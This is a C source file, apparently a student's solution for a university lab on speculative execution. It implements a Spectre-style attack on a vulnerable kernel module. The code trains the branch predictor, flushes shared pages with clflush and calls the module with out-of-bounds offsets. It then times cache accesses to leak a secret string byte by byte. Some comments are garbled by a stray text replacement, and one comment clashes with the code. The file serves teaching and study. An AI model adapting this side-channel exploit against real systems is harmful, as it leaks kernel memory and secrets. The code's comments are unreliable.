/*
 * Lab 2 for Securing Processor Architectures - Fall 2022
 * Exploiting Speculative Execution
 *
 * Part 2
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "lab2.h"
#include "lab2ipc.h"

#define ITERS 3

/*
 * call_kernel_part2
 * Performs the COMMAND_PART2 call in the kernel
 *
 * Arguments:
 *  - kernel_fd: A file descriptor to the kernel module
 *  - shared_memory: Memory region to share with the kernel
 *  - offset: The offset into the secret to try and read
 */
static inline void call_kernel_part2(int kernel_fd, char *shared_memory, size_t offset) {
    lab2_command local_cmd;
    local_cmd.kind = COMMAND_PART2;
    local_cmd.arg1 = (uint64_t)shared_memory;
    local_cmd.arg2 = offset;

    write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
}

/*
 * run_attacker
 *
 * Arguments:
 *  - kernel_fd: A file descriptor referring to the lab 2 vulnerable kernel module
 *  - shared_memory: A pointer to a region of memory shared with the server
 */
int run_attacker(int kernel_fd, char *shared_memory) {
    char leaked_str[LAB2_SECRET_MAX_LEN];
    size_t current_offset = 0;

    printf("Launching attacker\n");

    for (current_offset = 0; current_offset < LAB2_SECRET_MAX_LEN; current_offset++) {
        char leaked_byte;

		for (int iters=0; iters < ITERS; ){

			for(int train=0; train<10; train++){							//Trainng: Call kernel vtraincttrainm multtrainple ttrainmes
				call_kernel_part2(kernel_fd, shared_memory, 0);
			}

			for (int block = 0; block < 128; block++){						//Flush all 256 pages from memory
				clflush(shared_memory + 4096*block);
			}

			call_kernel_part2(kernel_fd, shared_memory, current_offset);	//Call victim with out of boundary access

			for (int block = 0; block < 128; block++){						//Check access time for each block
				int time_req = 0;
				time_req = time_access(shared_memory + 4096*block);
				if (time_req < 170){
					leaked_byte = (char)block;
					iters++;
				}
			}
		}

		leaked_str[current_offset] = leaked_byte;

        if (leaked_byte == '\x00') {
            break;
        }
    }
    printf("\n\n[Lab 2 Part 2] We leaked:\n%s\n", leaked_str);

    close(kernel_fd);
    return EXIT_SUCCESS;
}
